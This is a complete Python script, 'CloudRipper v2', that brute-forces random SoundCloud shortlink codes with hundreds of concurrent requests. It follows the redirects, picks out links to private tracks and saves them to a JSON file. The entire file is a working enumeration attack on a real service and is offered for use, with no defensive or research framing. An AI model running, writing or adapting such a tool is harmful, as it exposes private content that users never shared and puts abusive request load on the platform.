#!/usr/bin/env python3
from __future__ import annotations

import argparse
import asyncio
import json
import random
import re
import string
import time
from pathlib import Path
from urllib.parse import urlparse, urlunparse

import aiohttp
from colorama import Fore, Style, init

init(autoreset=True)

CHARSET = string.ascii_letters + string.digits
PRIVATE_RE = re.compile(r"/s-[a-zA-Z0-9]{11}")
OUTPUT = Path("output.json")

BANNER = f"""{Fore.LIGHTGREEN_EX}
  ╔══════════════════════════════╗
  ║  C L O U D R I P P E R  v2  ║
  ╚══════════════════════════════╝{Style.RESET_ALL}
"""


class Stats:
    def __init__(self) -> None:
        self.total = 0
        self.hits = 0
        self._t0 = time.perf_counter()

    @property
    def elapsed(self) -> float:
        return time.perf_counter() - self._t0

    @property
    def rate(self) -> float:
        e = self.elapsed
        return self.total / e if e > 0 else 0.0


async def probe(
    session: aiohttp.ClientSession,
    sem: asyncio.Semaphore,
    stats: Stats,
    verbose: int,
) -> str | None:
    code = "".join(random.choices(CHARSET, k=5))
    url = f"https://on.soundcloud.com/{code}"
    try:
        async with sem:
            async with session.get(url, allow_redirects=False) as r:
                stats.total += 1
                if r.status == 302:
                    loc = r.headers.get("Location", "")
                    clean = urlunparse(urlparse(loc)._replace(query=""))
                    if PRIVATE_RE.search(clean):
                        return clean
                    if verbose >= 1:
                        print(f"\n{Fore.BLUE}  ~ public   {clean}{Style.RESET_ALL}")
                elif verbose >= 2:
                    print(f"\n{Fore.RED}  - miss     {url}{Style.RESET_ALL}")
    except Exception:
        stats.total += 1
    return None


async def stat_loop(stats: Stats, stop: asyncio.Event) -> None:
    while not stop.is_set():
        print(
            f"\r{Fore.CYAN}{stats.elapsed:6.0f}s "
            f"{Fore.WHITE}{stats.total:>10,} req  "
            f"{Fore.GREEN}{stats.hits:>4} hits  "
            f"{Fore.YELLOW}{stats.rate:>7.0f} req/s{Style.RESET_ALL}   ",
            end="",
            flush=True,
        )
        await asyncio.sleep(0.4)


async def run(concurrency: int, verbose: int) -> None:
    results: list[str] = []
    seen: set[str] = set()
    stats = Stats()
    stop = asyncio.Event()

    connector = aiohttp.TCPConnector(
        limit=concurrency + 200,
        limit_per_host=0,
        ttl_dns_cache=600,
        enable_cleanup_closed=True,
    )
    session_timeout = aiohttp.ClientTimeout(total=10, connect=5)
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

    async with aiohttp.ClientSession(
        connector=connector,
        headers=headers,
        timeout=session_timeout,
    ) as session:
        sem = asyncio.Semaphore(concurrency)
        tasks: set[asyncio.Task] = set()
        stat_task = asyncio.create_task(stat_loop(stats, stop))

        def _fill() -> None:
            while len(tasks) < concurrency:
                t = asyncio.create_task(probe(session, sem, stats, verbose))
                tasks.add(t)

        _fill()

        try:
            while True:
                done, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks.difference_update(done)
                _fill()

                for t in done:
                    url = t.result()
                    if url and url not in seen:
                        seen.add(url)
                        stats.hits += 1
                        results.append(url)
                        print(f"\n{Fore.GREEN}[+] {url}{Style.RESET_ALL}")
                        OUTPUT.write_text(json.dumps(results, indent=2))

        except (KeyboardInterrupt, asyncio.CancelledError):
            stop.set()
            stat_task.cancel()
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, stat_task, return_exceptions=True)

    print(
        f"\n\n{Fore.YELLOW}[!] Stopped.  "
        f"{stats.hits} private tracks  /  {stats.total:,} requests  "
        f"({stats.rate:.0f} req/s){Style.RESET_ALL}"
    )
    if results:
        OUTPUT.write_text(json.dumps(results, indent=2))
        print(f"{Fore.GREEN}[+] Saved → {OUTPUT}{Style.RESET_ALL}")


def main() -> None:
    print(BANNER)
    p = argparse.ArgumentParser(
        description="Bruteforce SoundCloud shortlinks to find private tracks"
    )
    p.add_argument(
        "-c", "--concurrency",
        type=int, default=200, metavar="N",
        help="concurrent requests (default: 200)",
    )
    p.add_argument(
        "-v", "--verbose",
        action="count", default=0,
        help="-v show public tracks, -vv show all misses",
    )
    args = p.parse_args()

    print(
        f"{Fore.CYAN}[*] {args.concurrency} concurrent workers — "
        f"Ctrl+C to stop\n{Style.RESET_ALL}"
    )
    try:
        asyncio.run(run(args.concurrency, args.verbose))
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
